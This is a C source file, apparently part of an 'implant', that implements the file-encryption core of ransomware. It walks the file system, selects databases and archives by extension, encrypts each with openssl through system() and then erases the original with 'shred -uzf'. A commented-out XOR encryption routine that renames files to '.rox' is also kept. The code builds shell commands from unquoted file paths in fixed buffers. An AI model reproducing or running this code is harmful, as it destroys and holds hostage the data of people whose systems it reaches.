#include "implant.h"

/*
static const char g_key[KEY_LENGTH] = "0123456789";
static void encrypt_file(char const *inpath)
{
  char outpath[256];
  strcpy(outpath, inpath);
  strcat(outpath, ".rox");
  printf("%s -> %s\n", inpath, outpath);

  FILE* fi = fopen(inpath, "r");
  FILE* fo = fopen(outpath, "w");

  char c = fgetc(fi);
  unsigned j = 0;
  while (c != EOF)
  {
      fputc(c ^ g_key[j], fo);
      j = (j + 3) % KEY_LENGTH;
      c = fgetc(fi);
  }

  fclose(fi);
  fclose(fo);
}
*/

static void encrypt_file(char const *inpath)
{
  char cmd[256];
  memset(cmd, 0, sizeof(cmd));
  strcat(cmd, "openssl enc -aes-256-cbc -salt -pbkdf2 -in ");
  strcat(cmd, inpath);
  strcat(cmd, " -out ");
  strcat(cmd, inpath);
  strcat(cmd, ".enc -pass file:./key.bin");
#ifdef DEBUG
  printf("encrypt command: %s\n", cmd);
#endif
  system(cmd);
}

static void destroy_file(char const *fpath)
{
  char cmd[256];
  strcpy(cmd, "shred -uzf ");
  strcat(cmd, fpath);
  system(cmd);
}

static const char *g_filters[] = {
    "*.db", "*.zip", "*.tar", "*.gz", "*.7z", "*.iso", "*.bz2", "*.xz",
    "*.cab", "*.lz", "*.ar"
};


int handle_file(char const *fpath, struct stat const *tb, int typeflag)
{
    (void)tb;
    // not a file
    if (typeflag != FTW_F)
      return 0;

    for (unsigned i = 0; i < sizeof(g_filters) / sizeof(g_filters[0]); ++i)
    {
        if (fnmatch(g_filters[i], fpath, FNM_CASEFOLD) == 0)
        {
#ifdef DEBUG
            printf("found file: %s\n", fpath);
#endif
            encrypt_file(fpath);
            destroy_file(fpath);
            break;
        }
    }

    return 0;
}
